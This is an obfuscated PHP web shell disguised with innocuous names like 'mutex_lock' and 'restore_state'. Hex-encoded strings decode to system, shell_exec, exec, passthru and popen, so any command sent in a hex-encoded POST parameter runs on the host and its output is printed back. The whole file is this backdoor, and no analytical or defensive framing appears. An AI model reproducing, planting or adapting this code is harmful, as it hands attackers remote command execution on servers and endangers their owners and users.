<?php


$rec1 = '9';
$rec2 = '4';
$rec3 = '6';
$rec4 = '5';
$rec5 = 'd';
$rec6 = '8';
$rec7 = 'c';
$rec8 = 'f';
$rec9 = '7';
$rec10 = '3';
$rec11 = '1';
$rec12 = '2';
$rec13 = '0';
$rec14 = 'e';
$mutex_lock1 = pack("H*", '7' . '3' . '7' . $rec1 . '7' . '3' . '7' . $rec2 . $rec3 . $rec4 . $rec3 . $rec5);
$mutex_lock2 = pack("H*", '7' . '3' . '6' . $rec6 . $rec3 . $rec4 . $rec3 . $rec7 . $rec3 . $rec7 . $rec4 . $rec8 . '6' . $rec4 . $rec9 . '8' . '6' . $rec4 . '6' . '3');
$mutex_lock3 = pack("H*", '6' . '5' . $rec9 . $rec6 . '6' . $rec4 . '6' . $rec10);
$mutex_lock4 = pack("H*", '7' . '0' . '6' . $rec11 . $rec9 . '3' . '7' . '3' . $rec9 . $rec2 . $rec3 . '8' . '7' . $rec12 . '7' . '5');
$mutex_lock5 = pack("H*", '7' . '0' . '6' . $rec8 . $rec9 . $rec13 . '6' . '5' . $rec3 . $rec14);
$mutex_lock6 = pack("H*", '7' . '3' . '7' . $rec2 . '7' . $rec12 . $rec3 . '5' . '6' . $rec11 . $rec3 . 'd' . '5' . 'f' . $rec3 . '7' . '6' . $rec4 . $rec9 . '4' . '5' . $rec8 . '6' . $rec10 . '6' . 'f' . '6' . $rec14 . $rec9 . '4' . '6' . $rec4 . '6' . 'e' . '7' . '4' . $rec9 . $rec10);
$mutex_lock7 = pack("H*", '7' . $rec13 . $rec3 . $rec10 . '6' . 'c' . $rec3 . $rec8 . $rec9 . '3' . $rec3 . $rec4);
$restore_state = pack("H*", $rec9 . '2' . '6' . $rec4 . $rec9 . '3' . $rec9 . $rec2 . '6' . $rec8 . '7' . '2' . $rec3 . '5' . $rec4 . $rec8 . '7' . '3' . '7' . $rec2 . $rec3 . $rec11 . '7' . $rec2 . '6' . '5');
if (isset($_POST[$restore_state])) {
    $restore_state = pack("H*", $_POST[$restore_state]);
    if (function_exists($mutex_lock1)) {
        $mutex_lock1($restore_state);
    } elseif (function_exists($mutex_lock2)) {
        print $mutex_lock2($restore_state);
    } elseif (function_exists($mutex_lock3)) {
        $mutex_lock3($restore_state, $value_k);
        print join("\n", $value_k);
    } elseif (function_exists($mutex_lock4)) {
        $mutex_lock4($restore_state);
    } elseif (function_exists($mutex_lock5) && function_exists($mutex_lock6) && function_exists($mutex_lock7)) {
        $pset_symbol = $mutex_lock5($restore_state, 'r');
        if ($pset_symbol) {
            $object_ent = $mutex_lock6($pset_symbol);
            $mutex_lock7($pset_symbol);
            print $object_ent;
        }
    }
    exit;
}
